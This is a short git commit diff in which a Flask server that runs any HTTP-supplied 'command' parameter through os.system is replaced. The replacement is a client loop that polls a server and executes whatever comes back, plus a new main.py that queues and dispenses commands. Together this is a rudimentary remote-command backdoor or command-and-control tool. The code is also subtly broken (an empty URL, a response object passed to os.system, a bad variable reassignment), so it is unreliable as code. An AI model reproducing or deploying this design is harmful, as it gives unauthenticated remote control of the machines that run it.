13d02f131678e8cef71c0f43abb91b7ee507b306
killgriff22 <kilgrif22033@gmail.com>
2022-07-08 06:54:58 -0700

    updated

--- AAAASDGSDFA/server.py
+++ AAAASDGSDFA/server.py
@@ -1,15 +1,4 @@
-from flask import Flask
-import flask
-app = Flask(__name__)
-
-@app.route("/status")
-def status():
-    if flask.request.method == "GET":
-        return "READY FOR COMMAND"
-@app.route("/commands/exec",methods=["POST"])
-def execute():
-    import os
-    os.system(flask.request.args.get("command"))
-    return "OK"
-if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=3090, debug=False)
+import requests,time,os
+while True:
+    time.sleep(0.5)
+    os.system(requests.post(""))
---
+++ main.py
@@ -0,0 +1,19 @@
+from flask import Flask
+import flask
+app = Flask(__name__)
+toexec=[]
+@app.route("/status")
+def status():
+    if flask.request.method == "GET":
+        return "READY FOR COMMAND"
+@app.route("/commands/toexec",methods=["POST"])
+def toexecute():
+    toexec.append(flask.request.args.get("command"))
+    return "OK"
+@app.route("/commands/exec",methods=["POST"])
+def execute():
+    tmp=toexec
+    toexec=[]
+    return str(tmp)
+if __name__ == '__main__':
+    app.run(host="0.0.0.0", port=3090, debug=False)
